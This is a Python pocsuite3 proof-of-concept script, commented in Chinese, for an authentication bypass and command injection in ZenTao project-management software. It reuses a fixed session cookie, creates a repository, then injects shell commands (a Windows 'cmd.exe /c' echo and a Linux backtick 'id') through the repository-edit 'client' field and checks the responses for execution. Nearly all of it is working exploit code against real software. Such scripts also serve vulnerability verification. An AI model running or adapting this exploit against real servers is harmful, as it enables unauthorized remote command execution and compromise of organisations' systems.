from collections import OrderedDict
from urllib.parse import urljoin
import re,random,hashlib,json
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-02-23'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-02-23'  # 编写 PoC 的日期
    updateDate = '2023-02-23'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '禅道 rce'  # PoC 名称
    appPowerLink = 'https://www.zentao.net/'  # 漏洞厂商主页地址
    appName = '禅道'  # 漏洞应用名称
    appVersion = '''开源版:17.4<= 禅道 <=18.0.beta1
旗舰版:v3.4 <= 禅道 <= v4.0.beta1
企业版:v7.4 <= 禅道 <= v8.0.beta1'''  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        青岛易软天创网络科技有限公司-禅道是一款国产的开源项目管理软件。
        禅道登录处存在权限绕过导致命令注入。
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    def setcookie(self):
        self.headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': f'{self.url}/zentao/repo-create.html',
            'Cookie':'zentaosid=c91327f20fb21fa5cbd54bfcb9c4e9be;lang=zh-cn; device=desktop; theme=default'
        }
        self.sessions = requests.session()
        path = "/zentao/misc-captcha-user.html"
        url = self.url + path
        try:
            resq = self.sessions.get(url=url,headers=self.headers,timeout=5)
            return self.sessions
        except Exception as e:
            return
    def poc1(self):
        path = "/zentao/repo-create.html"
        # 随机生成字符串
        self.str_num = str(random.randint(10000,99999))
        url=self.url+path
        data = 'product%5B%5D=9999&SCM=Gitlab&name='+self.str_num+'&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=aaa'
        resq = self.sessions.post(url=url,headers=self.headers,data=data,timeout=5)
        #print(json.loads(resq.text)['locate'])
    def poc2(self):
        path = "/zentao/repo-edit-7-0.html"
        url=self.url+path
        windwos_data = 'product%5B%5D=9999&SCM=Subversion&serviceHost=&name='+self.str_num+'&path=aa&encoding=utf-8&client=cmd.exe /c "chcp 65001 %26%26 echo '+self.str_num+'" %26%26 <&account=&password=&encrypt=base64&desc=aaa'
        linux_data = 'product%5B%5D=9999&SCM=Subversion&serviceHost=&name='+self.str_num+'&path=aa&encoding=utf-8&client=`id`&account=&password=&encrypt=base64&desc=aaa'
        try:
            windwos_resq = self.sessions.post(url=url,headers=self.headers,data=windwos_data,timeout=5)
            linux_resq = self.sessions.post(url=url,headers=self.headers,data=linux_data,timeout=5)
            return windwos_resq.text,linux_resq.text
        except Exception as e:
            return
    def _verify(self):
        sessions = self.setcookie()
        self.poc1()
        windwos,linux = self.poc2()
        result = {}
        try:
            if str(self.str_num) in windwos or 'uid=' in linux:
                #print(resq.text)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['POC'] = self.url+'/zentao/repo-create.html'
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)